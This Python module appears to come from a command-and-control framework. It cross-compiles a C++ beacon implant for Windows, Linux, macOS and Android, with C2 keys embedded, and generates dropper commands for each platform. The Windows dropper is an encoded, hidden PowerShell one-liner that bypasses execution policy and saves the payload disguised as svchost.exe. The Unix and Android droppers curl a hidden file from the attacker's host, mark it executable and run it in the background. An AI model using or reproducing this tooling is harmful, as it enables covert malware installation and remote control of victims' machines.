import os
import shutil
import base64
import subprocess
from typing import Optional
from rich.console import Console
from phantom.utils.notifier import notifier
from phantom.utils.build_helper import check_build_env
from phantom.utils.c2_crypto import write_beacon_crypto_config, crypto_fingerprint

console = Console()

_PLATFORM_OUT = {
    "windows": "beacon.exe",
    "linux": "beacon_linux",
    "macos": "beacon_macos",
    "android": "beacon_android",
    "linux32": "beacon_linux_x86",
}


def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
    """Return True if binary is missing or crypto keys changed since last build."""
    beacon_out = os.path.join(beacon_dir, out_name)
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    if not os.path.exists(beacon_out):
        return True
    current = crypto_fingerprint()
    if not os.path.exists(hash_file):
        return True
    try:
        with open(hash_file, "r", encoding="utf-8") as f:
            return f.read().strip() != current
    except OSError:
        return True


def _mark_built(beacon_dir: str, out_name: str) -> None:
    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
    with open(hash_file, "w", encoding="utf-8") as f:
        f.write(crypto_fingerprint())


def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64") -> Optional[str]:
    """
    Compiles the C++ beacon for the specified platform and architecture.
    Embeds C2 keys from environment into crypto_config.h at build time.
    Returns the path to the compiled binary or None on failure.
    """
    if not check_build_env(platform, arch):
        notifier.error(f"Build environment not ready for {platform} ({arch}).")
        return None

    beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
    
    # Architecture-aware output name
    if platform == "linux" and arch == "x86":
        out_name = _PLATFORM_OUT["linux32"]
    else:
        out_name = _PLATFORM_OUT.get(platform)
        
    if not out_name:
        notifier.error(f"Unknown platform: {platform}")
        return None

    beacon_out = os.path.join(beacon_dir, out_name)

    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
        return beacon_out

    write_beacon_crypto_config(beacon_dir)

    if platform == "windows":
        console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
        try:
            if os.name == 'nt':
                if not shutil.which("cl"):
                    notifier.error("'cl.exe' (MSVC) not found.")
                    return None
                # Note: arch selection for MSVC usually depends on which vcvarsall.bat was run.
                subprocess.run(
                    ["cl", "/EHsc", "/O2", "/std:c++20", "src/main.cpp", f"/Fe:{out_name}",
                     "/I", "src",
                     "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "/SUBSYSTEM:WINDOWS"],
                    cwd=beacon_dir, check=True, capture_output=True, text=True)
            else:
                mingw_cpp = "x86_64-w64-mingw32-g++" if arch == "x64" else "i686-w64-mingw32-g++"
                if not shutil.which(mingw_cpp):
                    notifier.error(f"'{mingw_cpp}' not found for cross-compilation.")
                    return None
                subprocess.run(
                    [mingw_cpp, "-std=c++20", "-O2", "-s", "-o", out_name,
                     "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32", "-static", "-mwindows"],
                    cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Windows compilation failed:\n{e.stderr}")
            return None

    elif platform == "linux":
        console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
        try:
            cmd = ["g++", "-std=c++20", "-O2", "-s", "-o", out_name,
                   "-Isrc", "src/main.cpp", "-lcurl", "-lssl", "-lcrypto", "-lpthread"]
            if arch == "x86":
                cmd.insert(1, "-m32")
                
            subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Linux compilation failed:\n{e.stderr}")
            return None

    elif platform == "macos":
        console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
        if not os.path.exists(o32_cc):
            notifier.error(f"osxcross compiler not found at {o32_cc}")
            return None
        try:
            sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
            include_flags = ["-Isrc"]
            if os.path.exists(sdk_path):
                include_flags.append(f"-isysroot{sdk_path}")

            subprocess.run(
                [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
                 *include_flags, "src/main.cpp",
                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"macOS compilation failed:\n{e.stderr}")
            return None

    elif platform == "android":
        console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
        ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
        ndk_cc = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "bin", "aarch64-linux-android28-clang++")
        if not os.path.exists(ndk_cc):
            notifier.error(f"NDK compiler not found at {ndk_cc}")
            return None
        try:
            ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
            ndk_sysroot = os.path.join(ndk_prebuilt, "sysroot")
            ndk_include = os.path.join(ndk_sysroot, "usr", "include")
            ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
            subprocess.run(
                [ndk_cc, "-std=c++20", "-O2", "-s", "-o", "beacon_android",
                 "-Isrc", "src/main.cpp",
                 f"--sysroot={ndk_sysroot}",
                 f"-I{ndk_include}",
                 f"-L{ndk_lib}",
                 "-lcurl", "-lssl", "-lcrypto", "-static"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Android compilation failed:\n{e.stderr}")
            return None

    return None


def _payload_scheme(port: int) -> str:
    return "https" if port in (443, 8443) else "http"


def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64") -> str:
    """Generates the dropper command for the specified platform with auth token."""
    from phantom.utils.c2_crypto import get_payload_token

    token_param = f"auth={get_payload_token()}"
    scheme = _payload_scheme(lport)

    if (platform == "windows"):
        url = f"{scheme}://{lhost}:{lport}/api/v1/payload?{token_param}"
        # Stealthier PowerShell dropper: download to memory (if we had reflection) or obfuscated disk write
        # Here we use an obfuscated PowerShell one-liner to download and execute.
        ps_cmd = f"$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$f=$env:TEMP+'\\svchost.exe';$c.DownloadFile('{url}',$f);start-process $f -argumentlist '{lhost} {lport}'"
        b64_ps = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_ps}"

    elif platform == "linux":
        path = "payload_linux_x86" if arch == "x86" else "payload_linux"
        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_{path}?{token_param}"
        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"

    elif platform == "macos":
        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_macos?{token_param}"
        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"

    elif platform == "android":
        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_android?{token_param}"
        return f"curl -sk '{url}' -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {lhost} {lport} &"

    return ""
